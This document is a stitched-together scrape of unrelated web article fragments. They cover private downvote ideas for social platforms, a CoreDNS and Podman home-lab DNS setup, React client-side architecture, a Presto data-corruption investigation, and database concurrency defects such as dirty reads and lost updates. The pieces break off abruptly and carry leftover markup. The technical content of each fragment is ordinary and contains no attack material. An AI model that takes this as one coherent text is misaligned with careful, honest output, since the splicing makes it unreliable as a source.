<p><span><p><span></span><span><span>1</span></span><span></span> The technical term for these silent onlookers is "lurkers".</p></span></p><p><span><p><span></span><span>2</span><span></span> Although this post is focused on how you as an individual can make a difference one conversation at a time, I'm even more excited about the structural opportunity that platforms have to enable users to express disapproval more subtly. <span>One idea I'd really like to see platforms like Twitter or Reddit try is to provide a mechanism for low-friction, private, negative feedback. For example, you could imagine offering a button where you can downvote or thumbs-down content (i.e. the opposite of a Like), but the count is only visible to the OP and not to anyone else. </span><span>EDIT 7/4/2020:</span><span> My friend Zooko </span><a href="https://twitter.com/zooko/status/1279492581655588864">evolved</a><span> this idea slightly, and I dig the suggestion: "</span><span>Imagine a "ಠ_ಠ" button on each tweet. The poster finds out how many people *THAT THEY FOLLOW* clicked that button, but can't find out specifically who. They just know that the crowd of people *that they respect* has a certain air of disapproval."</span><span></span></p></span></p><p><span><p><span></span><span>3</span><span></span> Of course the downside of this approach is that you don't get the opportunity to spread these norms to onlookers of the conversation. This is not always the right tradeoff! Public feedback can help onlookers understand reasons why they should not admire that behavior. But doing it privately makes it much more likely that that particular person will actually change their behavior, which is what I'm optimizing for in these cases.</p></span><span andale="" mono";"="">

</code></pre> <p>The network will look like this.</p> <p>CT-HOST is a Fedora32 laptop running Podman and will manage container lifecycles. The host resides on two networks: LAN (192.168.185.0/24) where devices communicate and CONTAINER-LAN (10.89.0.0/24) where containers communicate. The CONTAINER-LAN is virtual and created by the linux kernel.</p> <p>Containers may be exposed on "ct-host" to devices on LAN by port-forwarding the container's port onto the hosts. Not every container needs to have their ports forwarded but to achieve name resolution this is required.</p> <h2>Name Resolution</h2> <p>Name resolution provides mapping from a hostname to a service. This is encountered every time "www.google.com" is typed into a browser. The name "www.google.com" is resolved to an IP address where web servers provide this service. This lab creates the <code>ldelossa.net</code> local domain.</p> <p>Personally, I don't want to write RFC 1035 zone files, host ancient bind servers, or deal with cryptic configs. There is a certain beauty in the syntax of a hosts file. A simple text file which maps a hostname to an IP address suits my needs well. The answer was found in <a href="https://coredns.io/">CoreDNS</a> and its <a href="https://coredns.io/plugins/hosts/">hosts</a> plugin.</p> <p>On top of a terse syntax the "hosts" plugin provides dynamic reloading. Changes to the file holding your hostname mappings will reload the server, the changes taking effect soon after.</p> <h3>Podman</h3> <p>Podman is the container runtime used in this lab.</p> <p>Podman and Systemd play along nicely. Systemd services can be generated directly from Podman. These service files can be used to start the container on boot, restart it on failure, create dependencies between containers, or other facilities Systemd offers.</p> <h3>CoreDNS Container</h3> <p>configuration:</p> <pre><code><span>$</span><span> cat Corefile</span>
.:53 {
  cache 10
  forward . 8.8.8.8 9.9.9.9
  log
  errors
}

ldelossa.net {
  cache 10
  hosts /etc/coredns/hosts {
  }
}
<span>$</span><span> cat hosts</span>
192.168.185.10 traefik.ldelossa.net
192.168.185.10 ct-host.ldelossa.net
192.168.185.10 prom.ldelossa.net
</code></pre> <p>CoreDNS with the host plugin uses two configuration files: "Corefile" and "hosts" file.</p> <p>The "Corefile" configures Coredns to forward requests not destined for <code>ldelossa.net</code> to Google's DNS and cache the results for a bit. Any requests for <code>ldelossa.net</code> are forwarded to the "hosts" plugin, using the file <code>/etc/coredns/hosts</code>.</p> <p>The "hosts" defines hostname mappings. For each entry in this file Coredns will return an A record mapping the hostname to the IP address.</p> <pre><code><span>$</span><span> podman create --network ct-host --name coredns -dt -p 192.168.185.10:53:53/tcp -p 192.168.185.10:53:53/udp -v /etc/containers/etc.d/coredns:/etc/coredns coredns/coredns -conf /etc/coredns/Corefile</span>
</code></pre> <p>Above shows the podman command used to create the container.</p> <p>A few things to note</p> <ul> <li>Port 53(udp/tcp) is exposed to other devices on LAN via port-forwarding</li> <li>Configuration files are mapped from <code>/etc/containers/etc.d/coredns</code> to <code>/etc/coredns</code> inside the container.</li> <li>Editing the "hosts" file on "ct-host" will reload Coredns without having to restart the container.</li> </ul> <pre><code><span>$</span><span> podman generate systemd --name coredns &gt; /etc/systemd/system/coredns-container.service</span>
<span>$</span><span> systemctl daemon-reload</span>
<span>$</span><span> systemctl <span>enable</span> coredns-container</span>
<span>$</span><span> systemctl start coredns-container</span>
</code></pre> <p>A SystemD service can be generated and enabled with the commands above.</p> <h3>Configuring Devices</h3> <p>A typical approach to configuring devices to utilize a custom DNS server would be DHCP. Unfortunately my router does not allow the configuration of DHCP (poo-poo to you ampliFi). However, devices can "opt-in" by setting their DNS server to <code>192.168.185.10:53</code>.</p> <p>As new services come onto the network simply editing <code>/etc/containers/etc.d/coredns/hosts</code> on "ct-host" will provide immediate resolution for devices configured with this DNS.</p> <h2>Conclusion</h2> <p>Home labs are a great way to learn new technologies. By utilizing Podman and CoreDNS a solution for name resolution was devised. Mapping configuration files from the host into containers provides a fast and dynamic way to update DNS in the lab.</p> <p>In <a href="https://www.ldelossa.is/blog/home-network-pt2">Part 2</a> a mechanism for routing hostnames to specific containerized services is introduced.</p> </article></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="html-wrapper"><div><p>When I first learned React and Redux in 2015, I made an enormous mess of the production codebase I was working on.</p>
<p>Back then, class-based components and Redux were the coolest kids on the block. This was my first time prepping up to work on a real-world React project, so I bought the best courses I could find on the topics and dove in.</p>
<p>After a couple of months, according to the React community, the way I was doing things was outdated. There were newer, cleaner, and recommended <em>best practices</em> for me to follow.</p>
<p>I think it's incredible that we question the way we do things. But my vast gap in knowledge of client-side architecture left me always finding it necessary to play catch up to refactor to the <em>new</em> approaches.  </p>
<p>These sentiments were also recently echoed in this painfully accurate Twitter thread from <a href="https://twitter.com/jhooks">Joel Hooks</a>. </p>
<blockquote>
<p>Developers are confused about where to start and what to choose when they start learning to write high-quality React applications. They want a strong foundation of knowledge and the confidence to architect React applications at scale built to current industry standards. </p>
</blockquote>
<blockquote>
<p>They are frustrated that there are no widely accepted standards for building React applications consistently, coherently, and <strong>with minimal risks to their professional reputations and livelihoods</strong>.</p>
</blockquote>
<blockquote>
<p>On top of that, there is a sea of choices and tradeoffs that React developers face every day. From how the project is even started, which framework to use, how to manage state, how does it get bundled, accessibility, and deployment just to get going.</p>
</blockquote>
<blockquote>
<p>At each f🐬kin' stop, there's a new choice to make: a new chance to be wrong.</p>
</blockquote>
<blockquote>
<p>Trying to build a solid foundation in React feels like a slot machine. — <a href="https://twitter.com/jhooks/status/1273392253646434304">@jhooks, June 17th, 2020</a></p>
</blockquote>
<p>Some point later in my developer journey, I too realized this was happening. I realized I could never keep up to date with the current trends of the libraries and frameworks I was using. I also decided I didn't want those nuances to dictate my professional reputation or livelihood. It wasn't good enough for me. I needed something better.</p>
<p>Eventually, I sought out the originating principles— the fundamentals, to client-side architecture. I sought out to construct a standard for building client-side apps. A professional one. One based on the software design principles that have helped us design robust software for decades.</p>
<hr>
<p>This guide teaches you client-side architecture fundamentals. </p>
<p>It's the result of my research using <a href="https://www.julian.com/blog/mental-model-examples">first principles</a> on how to <strong>design and develop robust, flexible, testable, and maintainable client-side applications.</strong></p>
<p>During my experience working on client-side apps of varying sizes, I've realized that  <strong><em>some</em> serious upfront design</strong> on the architecture can have a significant impact on the quality of the code for the duration of its life.</p>
<p>From simple dashboards to multi-layered apps with rendering layers, domain logic, multiple types of users - this guide teaches you the essential design principles front-end developers inadvertently code around within their everyday programming jobs. </p>
<p><strong>This guide proposes architectural standards for client-side web development</strong>.</p>
<p>While we're primarily focused on React, because it's the most popular library with the least structure, the principles are transferrable to any configuration of view-layer library or framework. </p>
<p>Programming tends to seem more like a trade than a science. Each tool, be it a state management library, API, or a transport-layer technology, is best suited to solve a particular set of problems. As a developer and a tradesperson, it's good to know how the tools in our toolbox are best used. </p>
<blockquote>
<p>... if all you have is a hammer, everything looks like a nail.</p>
</blockquote>
<p>At the end of this guide, you'll learn a standard for web development. You'll have a clear understanding of the <strong><a href="https://khalilstemmler.com/articles/client-side-architecture/introduction/(view,%20interaction,%20routing,%20state%20management,%20networking,%20auth,%20etc)">discrete layers of concerns</a></strong> in a client-side app: from the view layer to various forms of state management, and how to handle interaction (app) logic. </p>

<p>Allow me to paint the picture of why we need a better client-side architecture. To start, let's look at the foundation we're all currently working on top of.</p>
<h3 id="Model-View-controller">Model-View controller<a href="#Model-View-controller" aria-label="Model View controller permalink"></a></h3>
<p>You've probably heard of <strong><a href="https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller">Model-View-Controller</a></strong>, the architectural pattern that describes how to design apps involving user interfaces.</p>
<p><strong>MVC</strong> says that we should split our application into <em>model</em>, <em>view</em>, and <em>controller</em> layers. This is so each layer can focus on their own respective responsibilities. </p>
<ul>
<li>The model handles data and logic</li>
<li>The view handles presentation</li>
<li>and the controller turns user events into changes to the model</li>
</ul>
<p><img src="https://khalilstemmler.com/img/blog/client-side-architecture/Untitled.png" alt="img/blog/client-side-architecture/Untitled.png"></p>
<p>Model-view-controller architectural pattern. Used to separate the concerns between a client-side web app and backend services.</p>
<p>Most full-stack apps are comprised of a <strong>client-side portion,</strong> utterly separate from <strong>backend services</strong>. When users ask to make a change from the UI, it makes things happen by interacting with the backend through some API: in MVC, the API is the <em>controller</em>.</p>
<p>This works! And we like it. At least, we <em>must</em> — it's one of the first architectural patterns we teach to new developers learning how to build full-stack apps.</p>
<h3 id="Model-View-presenter">Model-View presenter<a href="#Model-View-presenter" aria-label="Model View presenter permalink"></a></h3>
<p>Where <em>Model-View-Controller</em> explained how to separate the concerns of a <strong>full-stack web application</strong>, <a href="https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93presenter">Model-View Presenter</a>, a derivation of MVC, told us how to separate the concerns of <strong>the client part</strong>.</p>
<p><img src="https://khalilstemmler.com/img/blog/client-side-architecture/model-view-presenter.png" alt="Model-View-Presenter"></p>
<p>Model-View-Presenter is the architectural pattern typically used within client applications. It's a derivation of the MVC pattern.</p>
<p>In <em>Model-View-Presenter</em>, the <strong>view</strong> creates user events. </p>
<p>Those user events get turned into <strong>updates</strong> or <strong>changes</strong> to the model. </p>
<p>When the <strong>model</strong> changes, the <strong>view</strong> is updated with the new data.</p>
<p>It's heartening to realize that <b>every client app uses some form of the model-view presenter pattern</b>.</p>
<!-- TODO: Add this -->
<!-- <p class="special-quote">Additionally, astute developers might notice this is a fancy way to say <i>Observer pattern</i>. It turns out that <a href="/articles/client-side-architecture/observer-pattern/">most client apps are built around the Observer Pattern</a>.

<h3 id="MVC--MVP-are-too-generic">MVC &amp; MVP are too generic<a href="#MVC--MVP-are-too-generic" aria-label="MVC  MVP are too generic permalink"></a></h3>
<p>MVC and MVP are great starters. They give you a <em>good enough</em> understanding of the communication pathways from a 5000-ft view. </p>
<p>Unfortunately, they both suffer from the same problem: being <em>too generic</em>.</p>
<p>In both MVC and MVP, <strong>the biggest challenge is that the <code>M</code> is responsible for way too much</strong>. </p>
<p>As a result, developers don't know <em>which tools</em> are responsible for <em>which tasks</em>.</p>
<p><img src="https://khalilstemmler.com/img/blog/client-side-architecture/Frame_42_(1).png" alt="img/blog/client-side-architecture/Frame_42_(1).png"></p>
<p>In MVC and MVP, the model is ambiguous. This makes matching the correct tool up to the task feel like a puzzle.</p>
<h3 id="Tasks-of-the-model">Tasks of the model<a href="#Tasks-of-the-model" aria-label="Tasks of the model permalink"></a></h3>
<p>In the real world, the model portion in most client-side web apps does a lot.</p>
<p><strong>State management —</strong> Most apps need a way to fetch state, update state, and configure reactivity to when state changes, the <em>view</em> can re-render.</p>
<p><strong>Networking &amp; data fetching —</strong> The actual <em>data-fetching</em> concern is sometimes conflated as part of the model. The data fetching and networking aspect of an app need to know about backend services, formulate requests, handle responses, and marshal data, but it also needs to signal request <em>metadata</em> (ie: <code>isLoading</code>, <code>error</code>). What about features like optimistic updates? Is that a concern of the model? I think it is.</p>
<p><strong>Model behavior (ie: domain, app, or interaction logic) —</strong> Deciding what happens next when a user clicks <em>submit</em>, or wants to interact with something on the page is a form of <em><a href="https://www.notion.so/Client-Side-Architecture-Basics-Generic-0f4a99f4f7a9445e928f67d058656a52#025b4ebebef64948a0fc5bfaa598309f">interaction logic</a></em>. Sometimes there are rules we need to enforce. They can be simple — like validation before sending off an API call. They can be complicated — like deciding if a chess piece can be dropped on the selected square.
Some call this <em>app logic</em>, which I believe to be sufficient since it describes how our app responds to user events. Alternatively, I call it <em>interaction logic</em> because it explains what happens in response to <em>user interaction</em>.
There's one other kind of logic here, and that's <em>domain logic</em>. Domain logic doesn't normally have anything to do with the application itself. Instead, it originates from an understanding of the domain. For example, while displaying a modal <em>before move a chess piece</em> might be <strong>application/interaction logic</strong>, enforcing the policy that <em>a knight can only move in an L-shaped fashion</em> is a form of <strong>domain logic</strong>. That rule originates from understanding the domain of <em>chess</em> where the application-specific logic holds rules about how the user interacts with the app. Usually, domain logic lives behind backend services, and if we break the rules, we can get an error back as a response. Still, sometimes we co-locate it on the client-side, especially for more complex applications.</p>
<p><strong>Authentication &amp; authorization logic (specific type of model behavior) —</strong> This is another specific type of model behavior, but it's common enough to mention. Most of the time, authN &amp; authR finds itself being used from within the view layer (show <em>Login screen if not authenticated</em>). Sometimes, it manifests in the <strong>application/interaction</strong> layer as well, preventing access to specific operations.</p>
<h3 id="Tools-used-within-the-model">Tools used within the model<a href="#Tools-used-within-the-model" aria-label="Tools used within the model permalink"></a></h3>
<p>These are all common challenges to solve. In 2020, the developer toolbox for a React developer looks a little something like this:</p>
<ul>
<li>React hooks</li>
<li>Redux</li>
<li>Context API</li>
<li>Apollo Client</li>
<li>xState</li>
<li>react-query</li>
<li>and now, recoil</li>
</ul>
<p>Each of these are capable of addressing a particular piece of the <em>ambiguous model</em> we described, but matching the correct tool to the proper concern can be tricky.</p>
<p>Of course, it's tricky. We don't have a standard language to describe the different concerns. Instead of thinking about the tools right away, I think we need to back up and look at the bigger picture of the problems to be solved.</p>

<p>We need a shared language to describe these architectural concepts upon which we either:</p>
<ul>
<li>Configure a library or a framework to solve</li>
<li>Write the code ourselves for</li>
</ul>
<p>Most React developers know the implementation-specific terminology like hooks, reducers, context, and props, but architectural concerns are sometimes misunderstood.</p>

  <div itemprop="articleBody">
    <p>It all started on an Thursday afternoon in March, when <a href="https://github.com/sopel39">Karol Sobczak</a>
was grilling Presto with heavy rounds of benchmarks, as we were ramping up to Starburst Enterprise
Presto 332-e release. Karol discovered what seemed to be a serious regression, and turned out to be even more
serious Cloud environment issue.</p>

<!--more-->



<p>At the Presto project, we take serious care of stability and efficiency, so releases undergo
rigorous performance benchmarks. The intention is to safe guard against any performance regressions
or stability problems. Usually, the performance improvements are benchmarked separately when they
are being added to the codebase. At Starburst, those benchmarks are even more important, especially
for the Starburst Enterprise Presto LTS releases.</p>

<p>On a side note, we use <a href="https://github.com/prestosql/benchto/">Benchto</a> for organizing
<a href="https://github.com/prestosql/presto/tree/master/presto-benchto-benchmarks">Presto benchmark suites</a>,
executing them and collecting the results. We use managed <a href="https://kubernetes.io/">Kubernetes</a> in a public
cloud for provisioning Presto clusters, along with <a href="https://www.starburstdata.com/presto-on-kubernetes/">Starburst Enterprise Presto Kubernetes</a>.
We use <a href="https://jupyter.org/">Jupyter</a> for producing result reports in HTML and PDF formats.</p>



<p>It all started in March, when <a href="https://github.com/sopel39">Karol Sobczak</a>
was grilling Presto with heavy rounds of benchmarks for the Starburst Enterprise Presto 332-e release.
On one Thursday afternoon he reported stability problems, with few benchmark runs failing with
exceptions similar to:</p>

<div><div><pre><code>Query failed (#20200326_150852_00338_dj225): Unknown block encoding:
LONG_ARRAY� � �� � @@@���� �@  @ � �@@@ @@� @�@D�� @@��@ `� @@� @#�@ � 0�
... (9550 more bytes)
</code></pre></div></div>

<p>In Presto, a block encoding is a way of encoding a particular Block type (here, a <code>LongArrayBlock</code>).
They are used when exchanging blocks of data between Presto nodes, or in spill to disk.
Blocks form a polymorphic class hierarchy, so every time a block is encoded, we need
to also store the encoding identifier. The encoding identifier (here, the <code>LONG_ARRAY</code> string)
is written as <code>&lt;string length&gt;</code> (4-byte, signed integer in little-endian) followed by
<code>&lt;string bytes&gt;</code> containing the UTF-8 representation of the encoding id. Clearly, in the case above,
the receiver read the <code>&lt;encoding id length&gt;</code> as 9623 instead of 10! How could that be ever possible?</p>

<p>Presto 332 brought a lot of good changes and upgrade to Java 11 was one of them.
Therefore, Starburst Enterprise Presto 332-e was the first Starburst release using Java 11 by default.
For earlier releases, we ran benchmarks using AWS EC2 machines orchestrated with <a href="https://www.starburstdata.com/presto-aws-cloud/">Starburst’s Presto
CloudFormation Template (CFT)</a>. This was also the first time we did
Presto release benchmarks running on Kubernetes clusters, with AWS EKS. We could suspect many different factors
as being the cause. We started to sift through the code, search team’s “collective brain” and
the Internet for any ideas. One of the important sources was Vijay Pandurangan’s writeup on <a href="https://tech.vijayp.ca/linux-kernel-bug-delivers-corrupt-tcp-ip-data-to-mesos-kubernetes-docker-containers-4986f88f7a19">data
corruption bug discovered by Twitter in 2015</a>. Of course, we also repeated benchmark runs. Seeing is believing.</p>



<p>On the next day, a customer reported similar problems with their Presto cluster. Of course, they
were not running a yet-to-be-released version that we were still benchmarking. They run into what seemed to
be a very serious regression in a Starburst Enterprise Presto 323-e release line. The customer was also using
the AWS cloud, but not the Kubernetes deployment. They were using <a href="https://www.starburstdata.com/presto-aws-cloud/">CFT-based deployment</a>
– the same stack we were using for all our release benchmarks so far – and we had never run into issues like this before.
As the customer was using a fresh-off-press latest minor release, we decided (in spirit of global health care trend)
to “quarantine” that release and roll back the customer installation to the previous version.</p>

<p>However, the fact that a small bug fix release triggered data problems was unnerving. The fact that we
did not discover any of these problems before, was even more unnerving.</p>



<p>As we were running more and more, and even more test runs, we discovered new failure modes.
For example:</p>
<div><div><pre><code>Query failed (#20200327_001931_00020_8di4r): Cannot cast DECIMAL(7, 2) '18734974449861284.67' to DECIMAL(12, 2)
</code></pre></div></div>
<p>Well, this message is not <em>wrong</em>. It’s not possible to cast <code>18734974449861284.67</code> to <code>DECIMAL(12, 2)</code>.
Except that it is <em>also</em> not possible to have a <code>DECIMAL(7, 2)</code> with such value. Something wrong happened to the
data. At that moment, we realized the problem was very serious, because data could become corrupted.
This corrupted data could lead to a failure (like above), but it could also lead to incorrect query results,
or incorrect data being persisted (in case of <code>INSERT</code> or <code>CREATE TABLE AS</code> queries). We created
a virtual War Room (that is, a Slack channel), got together all Presto experts and our experienced field team
to discuss potential causes, further diagnostics and mitigation strategies.</p>

<p>Since the problem was affecting data exchanges between Presto nodes, we listed the following strategies
to try to dissect the problem:</p>

<ul>
  <li>determining which query (queries) is (are) causing failures,</li>
  <li>running with HTTP/2,</li>
  <li>reverting to running on Java 8,</li>
  <li>enabling exchange compression (as decompression is very sensitive to data corruption),</li>
  <li>trying to upgrade Jetty,</li>
  <li>determining whether failures correlate with JVM GC activity,</li>
  <li>inspecting the source code.</li>
</ul>



<p>We were able to quickly prototype and verify some of the ideas. Switching to HTTP/2 or
upgrading Jetty to the latest version did not help. Nor did downgrading to Jetty version
that had been using for a long time. We also verified that problem was reproducible with Java 8,
so we concluded Java 11 was not the cause of it.</p>



<p>We identified the problem occurs somewhere within exchanges, between one Presto worker
node serializing a <code>Page</code> object (basic unit of data processing in Presto) and another node
deserializing it.</p>

<p>While decimal cast failure didn’t directly point at the data corruption problem (there could
be many other reasons for it), there was no other explanation for the <code>Unknown block encoding</code> exceptions.
The serialization is done in <code>PagesSerde.serialize</code> (used by <code>TaskOutputOperator</code>, the data sender) and
deserialization is done in <code>PagesSerde.deserialize</code> (used by <code>ExchangeOperator</code>, the
receiver of the data). As the logic is nicely encapsulated in <code>PagesSerde</code> class, we
added checksums to the serialized data: <code>&lt;checksum&gt; &lt;serialized page&gt;</code>.
This felt like a smart move – except that it gave us nothing more than a confirmation that
there is a problem (“checksum failure”).
This we already knew.</p>

<p>We considered adding logging to capture data going out from one node and going in on
another node, but that would be huge amount of logs. One run of benchmarks transfers
hundreds of terabytes of data between the nodes.</p>

<p>We went ahead and created a Presto build that added data redundancy to be able to reconstruct
the data on the receiving side.
There are many <a href="https://en.wikipedia.org/wiki/Erasure_code">well-known error-correction codes</a>
(e.g. <a href="https://en.wikipedia.org/wiki/Reed%E2%80%93Solomon_error_correction">Reed–Solomon error correction</a>
available in Hadoop 3). In our case, speed of <em>implementation</em> (a.k.a. simplicity) was a deciding factor,
so we added data mirroring: <code>&lt;checksum&gt; &lt;serialized page&gt; &lt;serialized page&gt;</code>.
In order to avoid logging of all the data exchanges, we added the deserialized pages (both copies)
to the exceptions being raised.</p>

<div><div><pre><code>java.sql.SQLException: Query failed (#20200401_113622_00676_p7qp7): Hash mismatch, read: 1251072184702746109, calculated: 7591448164918409110
    Suppressed: java.lang.RuntimeException: Slice, first half: 040000000A0000004C4F4E475F415252.... (945 kilobytes)
    Suppressed: java.lang.RuntimeException: Slice, secnd half: 040000000A0000004C4F4E475F415252.... (945 kilobytes)
</code></pre></div></div>

<p>The exception told us the first part was changed, since read checksum did not match the calculated
checksum (it was calculated based on the first copy of the data and was different than the checksum
calculated on the sending side).
Having the encoded data in the exception like that, it was easy to extract the actual data and compare,
so now we could see <em>how</em> the data was changed.</p>

<div><div><pre><code>cat failure.txt | grep 'Slice, first half' | cut -d: -f4- | sed 's/^ *//' | xxd -r -p &gt; changed
cat failure.txt | grep 'Slice, secnd half' | cut -d: -f4- | sed 's/^ *//' | xxd -r -p &gt; original
</code></pre></div></div>

<p>Comparing binary files is fun, but in practice it can be more convenient to compare <code>hexdump</code> output.
The output below was created with <code>vimdiff &lt;(hexdump -Cv original) &lt;(hexdump -Cv changed)</code>.</p>

July 3, 2020 | https://ketanbhatt.com/db-concurrency-defects/ | <a href="https://web.archive.org/web/*/https://ketanbhatt.com/db-concurrency-defects/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>I came across defects caused by race conditions that might occur when we work with databases, while reading <a href="https://www.goodreads.com/book/show/23463279-designing-data-intensive-applications">Designing Data-Intensive Applications (DDIA)</a>, by <a href="https://martin.kleppmann.com/">Martin Kleppmann</a>. It turns out that if we aren’t careful, concurrent transactions can cause a lot of headaches, to say the least. Finding it easy to forget or confuse these defects for each other, I decided to catalogue them here so they might help others and future me.</p>
<p>I have derived a bulk of these learnings and examples from DDIA itself, and all the credit for that work goes to Martin Kleppmann.</p>
<h3 id="first-some-basics"><a href="#first-some-basics" aria-label="first some basics permalink"></a>First, some basics</h3>
<p>Before we start, I want to quickly go over some basics so that a wider audience can follow along more easily.</p>
<ul>
<li>
<p><strong>Transaction</strong></p>
<ul>
<li>A “transaction” groups several reads and writes together into one logical unit. Conceptually, all the reads and writes in a transaction are executed as one operation: either the entire transaction succeeds (commits successfully) or it fails (aborts and rolls back).</li>
<li>For a longer explanation, this might be helpful: <a href="https://stackoverflow.com/questions/974596/what-is-a-database-transaction">What is a database transaction?</a></li>
</ul>
</li>
<li>
<p><strong>Commit and Rollback</strong></p>
<ul>
<li>
<p>From <a href="http://itdoc.hitachi.co.jp/manuals/3020/3020635100e/W3510158.HTM">this doc</a>:</p>
<blockquote>
<p>The process of placing into effect in the database the updates made by a transaction is called commit. The process of invalidating the updates made by a transaction is called rollback</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p><strong>Race Conditions or Concurrency Defects</strong></p>
<ul>
<li>Roughly, if two or more transactions simultaneously access (read or write) the same data, these transactions will be considered concurrent. Based on what operations these transactions perform on the data, we might run into anomalous behaviour like losing writes, or reporting incorrect data, or permanently making the data inconsistent.</li>
<li>To get a better idea, take a look at this example: <a href="https://en.wikipedia.org/wiki/Race_condition#Example">Race condition example</a></li>
</ul>
</li>
</ul>
<p>I have strictly kept the scope of this article to be an introduction to defects that can occur because of concurrency. Resolving or avoiding these defects is a larger topic that I might discuss in a later post. For now, I just wanted to make the reader aware of these problems. Knowing that a problem exists is often the first step towards dealing with it.</p>

<h2 id="dirty-read"><a href="#dirty-read" aria-label="dirty read permalink"></a>Dirty Read</h2>
<p><strong>Tl;dr: If a transaction can read data written by another transaction that is not yet committed (or aborted), this read is called a “Dirty Read”.</strong></p>
<p>Changes made by an ongoing transaction only become permanent once the transaction commits. If a Database allows other transactions to read updates made by a still uncommitted/incomplete transaction, it can lead to unintended outcomes:</p>
<ol>
<li>If an in-progress transaction makes several changes to the database, and dirty reads are not prevented, other concurrent transactions might be able to see some of these changes while the rest are still being made. This is confusing to users and could cause other transactions to take incorrect decisions.</li>
<li>A transaction can abort, requiring its writes to be rolled back. If the database allows dirty reads, another transaction might see data that was later rolled back. This can cause bugs and issues that are hard to reason about.</li>
</ol>
<br>
Let's look at an example: Nancy has $1000 in her bank, split equally between two accounts:
<ul>
<li>Account A: Her general account that she uses for receiving and spending money</li>

<p>Nancy decides to transfer 100$ from Account A to Account B. The Bank makes this transfer by carrying out a transaction with two operations:</p>
<ol>
<li>Subtract 100$ from Account A</li>
<li>Add 100$ to Account B</li>
</ol>
<p>Let’s assume that Nancy has her Bank’s app open and she is looking at her Account balances while the transfer is happening. Thankfully, her Bank’s database prevents dirty reads. This is what she sees:</p>

<p>While looking at the app, Nancy always only sees that data that is committed to the database, and never a partial state.</p>
<p>But if the database did not prevent dirty reads, this is what she could see:</p>

<p>For a moment there, she gets back an incorrect balance which is lower than what she should have. This happened because the database made the partial changes from her transfer transaction visible to Nancy’s transaction, even before it was committed.</p>
<p>In this particular case, there wasn’t any lasting harm done. She would see her correct balance if she were to refresh again, but not all cases would be this harmless.</p>
<p>Thankfully, dirty reads are prevented by default by all major databases.</p>

<h2 id="dirty-write"><a href="#dirty-write" aria-label="dirty write permalink"></a>Dirty Write</h2>
<p><strong>Tl;dr: If a transaction can overwrite data written by another transaction that is not yet committed (or aborted), this read is called a “Dirty Write”.</strong></p>
<p>Similar to dirty reads, dirty writes happen when a transaction can access and overwrite data written by a still uncommitted/incomplete transaction. Dirty writes should be prevented because they can lead to messed up partial states caused by the intermingling of writes made by multiple transactions. These states would be difficult to reason about and could cause terrible things to happen.</p>
<br>
Let's look at an example: Ginika and Ranyinudo are software engineers. Their managers (different people) want to set up a meeting with them. The meeting system makes two database writes while booking a room:
<ol>
<li>It sets the room’s name to reflect the meeting</li>
<li>It adds the participant to the room</li>
</ol>
<p>Now, Ginika’s manager wanted to schedule a regular 1-1 with her, whereas Ranyinudo’s manager wanted to tell her that she is getting promoted (she is going to be a Senior)! They both proceed to book the same room for the same time. As these examples go, their requests for booking the room were concurrent, and their database does not prevent dirty writes. This is what happens:</p>
<p><span>

    </span></p>
<p>Because the database allows transactions to overwrite uncommitted data written by other transactions, we have reached this incorrect partial state. Ginika’s Manager overwrote the Room’s name, and Ranyinudo’s Manager overwrote the participant. In this case, disaster was averted because humans are involved, Ranyinudo’s manager told her of the database mishap and all was fine. But in the wild, this could lead to a lot problems.</p>
<p>Again, thankfully, dirty writes are prevented by default by all major databases.</p>
<h4 id="is-preventing-dirty-writes-enough"><a href="#is-preventing-dirty-writes-enough" aria-label="is preventing dirty writes enough permalink"></a>Is preventing dirty writes enough?</h4>
<p>At this point, astute readers might notice that even if dirty write was prevented, one of the transaction would still overwrite the other. And that is correct. But at least the final state would not be a partial state.</p>
<p>In our example, if dirty writes are prevented, the room will be set for an “Appraisal” with Ranyinudo as a participant because Ranyinudo’s transaction committed last. If Ginika’s transaction would have committed after Ranyinudo’s, the room would say “1-1” with Ginika as the participant. Notice how the final state isn’t an inter-mingled mess of these 4 writes.</p>
<p>Even though this works out fine for us in this case, this overwriting is still a problem. We will explore this more in <a href="#lost-update">Lost Update</a>.</p>

<h2 id="read-skew"><a href="#read-skew" aria-label="read skew permalink"></a>Read Skew</h2>
<p><strong>Tl;dr: A transaction (typically, long running) may read different parts of the database at different points in time causing a Read Skew.</strong></p>
<p>If each query in a transaction can always see the latest committed data, some queries would read an older version of the data, whereas some would read from a newer version. This can result in inconsistencies best explained by an example.</p>
<p>Let’s go back to Nancy’s example where she was transferring 100$ from Account A to B. Now let’s assume that while this transfer is happening, the bank is running a scheduled daily backup of the database. This backup transaction is carried out by querying for all the account balances in the bank. Since a bank usually has a lot of accounts, the backup takes hours to complete.</p>
<p>In a database susceptible to Read Skew, this scenario might occur:</p>
<p><span>
      <a href="https://ketanbhatt.com/static/f597828b8e3f6a300d7756c017f64466/eae39/read-skew-1.png" target="_blank" rel="noopener">

  </a>
    </span></p>
<p>According to this horrible horrible backup (we are the bank), Nancy has a total of $1100 instead of $1000. This happened because when the backup transaction read the balance in Account B, it read the updated version of the balance. Since Account A’s balance was read before the transfer, we now have an inconsistency. If this backup is needed to be restored, this inconsistency will become permanent.</p>
<p>Similar to this backup example, Read Skew can cause nonsensical data to be returned by analytical queries that often need to scan over a large number of rows.</p>
<p><strong>Unfortunately, not all databases prevent this defect by default and you should consider verifying this for your database.</strong></p>

<p><strong>Tl;dr: Two or more concurrent transactions might read the same value from the database, modify it, and write it back, not including the modification made by the other concurrent transactions. This could lead to updates getting lost.</strong></p>
<p>Lost updates is one of the most common defect that happens due to race conditions. If you have been developing software for a few years, there is a high chance you have caused or experienced bugs because of this problem.</p>
<p>It is an easy defect to cause. Luckily, it is also easy to resolve in many cases. Any situation where we read a value from the database, modify it, and then set it back, could fall prey to this defect. This set of operations can be called a “read-modify-write” cycle. I like to remember it by the fun abbreviation: <a href="https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use">TOCTTOU</a>.</p>
<p>A few scenarios where updates can get lost are:</p>
<ol>
<li>Incrementing a counter</li>
<li>Updating an Account Balance</li>
<li>Updating a complex value like a JSON or a list.</li>
</ol>

Without troubling Nancy further, let's look at a common example. Assume that we store a list of IDs in redis (or memcached, or any other database). There are two concurrent …</section></div>

            <h3 itemprop="description">
